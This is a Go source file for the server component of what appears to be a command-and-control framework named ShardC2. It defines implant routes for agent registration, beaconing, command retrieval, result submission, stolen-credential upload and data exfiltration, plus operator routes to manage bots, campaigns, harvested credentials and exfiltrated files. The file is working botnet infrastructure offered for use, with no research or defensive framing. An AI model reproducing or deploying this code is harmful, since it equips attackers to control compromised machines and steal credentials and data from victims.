package server

import (
	"context"
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/rand"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/pem"
	"fmt"
	"math/big"
	"os"
	"time"

	"github.com/gofiber/fiber/v2"
	"github.com/gofiber/fiber/v2/middleware/limiter"
	"github.com/gofiber/fiber/v2/middleware/logger"
	"github.com/gofiber/fiber/v2/middleware/recover"
	"github.com/shardc2/shardc2/internal/database"
	"github.com/shardc2/shardc2/internal/server/engine"
	"github.com/shardc2/shardc2/internal/server/handlers"
	"github.com/shardc2/shardc2/internal/server/middleware"
)

type ServerConfig struct {
	OperatorToken string
	ImplantKey    string
	PayloadKey    []byte
	C2URL         string
}

type Server struct {
	app    *fiber.App
	db     *database.DB
	config ServerConfig
	logger *Logger
	engine *engine.Engine
}

func New(db *database.DB, cfg ServerConfig) *Server {
	app := fiber.New(fiber.Config{
		ServerHeader:          "",
		DisableStartupMessage: true,
		AppName:               "ShardC2",
		BodyLimit:             50 * 1024 * 1024,
	})

	app.Use(recover.New())
	app.Use(logger.New(logger.Config{
		Format: "${time} | ${status} | ${latency} | ${ip} | ${method} ${path}\n",
	}))

	s := &Server{app: app, db: db, config: cfg, logger: NewLogger(os.Stdout, "INFO"), engine: engine.New(db, cfg.C2URL, cfg.ImplantKey)}
	s.setupRoutes()

	app.Static("/dashboard", "./web/dashboard")
	app.Get("/", func(c *fiber.Ctx) error {
		return c.Redirect("/dashboard/")
	})

	go s.engine.Start(context.Background())

	return s
}

func (s *Server) setupRoutes() {
	api := s.app.Group("/api/v1")

	api.Get("/health", func(c *fiber.Ctx) error {
		return c.JSON(fiber.Map{"status": "ok", "service": "shardc2"})
	})

	botHandler := handlers.NewBotHandler(s.db)
	cmdHandler := handlers.NewCommandHandler(s.db)
	credHandler := handlers.NewCredentialHandler(s.db)
	campHandler := handlers.NewCampaignHandler(s.db)
	exfilHandler := handlers.NewExfilHandler(s.db)

	// Agent routes (per-route middleware to avoid prefix collision)
	implantMW := middleware.ImplantAuth(s.config.ImplantKey)
	agentMW := middleware.AgentAuth(s.db)
	payloadMW := middleware.PayloadCrypto(s.config.PayloadKey)
	agentLimiter := limiter.New(limiter.Config{Max: 60, Expiration: time.Minute})

	agent := api.Group("/agent")
	agent.Get("/binary", func(c *fiber.Ctx) error {
		arch := c.Query("arch", "arm64")
		if arch == "amd64" || arch == "x86_64" {
			return c.SendFile("./bin/shardc2-agent-amd64", false)
		}
		return c.SendFile("./bin/shardc2-agent", false)
	})
	agent.Post("/register", payloadMW, implantMW, botHandler.Register)
	agent.Post("/beacon", payloadMW, agentMW, agentLimiter, botHandler.AgentBeacon)
	agent.Get("/commands", payloadMW, agentMW, agentLimiter, cmdHandler.AgentGetPending)
	agent.Post("/result", payloadMW, agentMW, agentLimiter, cmdHandler.SubmitResult)
	agent.Post("/credentials", payloadMW, agentMW, agentLimiter, credHandler.Submit)
	agent.Post("/exfil", payloadMW, agentMW, agentLimiter, exfilHandler.Upload)
	agent.Post("/refresh-token", payloadMW, agentMW, botHandler.RefreshToken)

	// Operator routes
	op := api.Group("", middleware.OperatorAuth(s.config.OperatorToken))
	op.Use(limiter.New(limiter.Config{Max: 120, Expiration: time.Minute}))

	bots := op.Group("/bots")
	bots.Get("/", botHandler.List)
	bots.Get("/:id", botHandler.Get)
	bots.Delete("/:id", botHandler.Remove)

	cmds := op.Group("/commands")
	cmds.Post("/", cmdHandler.Create)
	cmds.Get("/history/:bot_id", cmdHandler.History)

	creds := op.Group("/credentials")
	creds.Post("/", credHandler.Submit)
	creds.Get("/", credHandler.List)
	creds.Delete("/:id", credHandler.Delete)

	camps := op.Group("/campaigns")
	camps.Post("/", campHandler.Create)
	camps.Get("/", campHandler.List)
	camps.Get("/:id", campHandler.Get)
	camps.Put("/:id", campHandler.Update)
	camps.Delete("/:id", campHandler.Delete)
	camps.Post("/:id/bots", campHandler.AssignBots)
	camps.Delete("/:id/bots/:bot_id", campHandler.RemoveBot)
	camps.Get("/:id/bots", campHandler.ListBots)
	camps.Post("/:id/launch", campHandler.Launch)
	camps.Get("/:id/progress", campHandler.Progress)
	camps.Get("/:id/results", campHandler.Results)

	exfil := op.Group("/exfil")
	exfil.Get("/", exfilHandler.List)
	exfil.Get("/:id", exfilHandler.Download)
	exfil.Delete("/:id", exfilHandler.Delete)

	op.Get("/stats", botHandler.Stats)
}

func (s *Server) Start(addr string) error {
	fmt.Printf("[*] C2 Server listening on %s\n", addr)
	return s.app.Listen(addr)
}

func (s *Server) StartTLS(addr, certFile, keyFile string) error {
	fmt.Printf("[*] C2 Server listening on %s (TLS)\n", addr)
	return s.app.ListenTLS(addr, certFile, keyFile)
}

func (s *Server) Shutdown() error {
	return s.app.Shutdown()
}

func GenerateSelfSignedCert(certPath, keyPath string) error {
	key, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	if err != nil {
		return fmt.Errorf("generate key: %w", err)
	}

	serial, _ := rand.Int(rand.Reader, new(big.Int).Lsh(big.NewInt(1), 128))
	tmpl := x509.Certificate{
		SerialNumber: serial,
		Subject:      pkix.Name{Organization: []string{"ShardC2"}},
		NotBefore:    time.Now(),
		NotAfter:     time.Now().Add(365 * 24 * time.Hour),
		KeyUsage:     x509.KeyUsageDigitalSignature,
		ExtKeyUsage:  []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
	}

	certDER, err := x509.CreateCertificate(rand.Reader, &tmpl, &tmpl, &key.PublicKey, key)
	if err != nil {
		return fmt.Errorf("create certificate: %w", err)
	}

	cf, err := os.Create(certPath)
	if err != nil {
		return fmt.Errorf("create cert file: %w", err)
	}
	defer cf.Close()
	pem.Encode(cf, &pem.Block{Type: "CERTIFICATE", Bytes: certDER})

	keyDER, err := x509.MarshalECPrivateKey(key)
	if err != nil {
		return fmt.Errorf("marshal key: %w", err)
	}
	kf, err := os.OpenFile(keyPath, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0600)
	if err != nil {
		return fmt.Errorf("create key file: %w", err)
	}
	defer kf.Close()
	pem.Encode(kf, &pem.Block{Type: "EC PRIVATE KEY", Bytes: keyDER})

	return nil
}
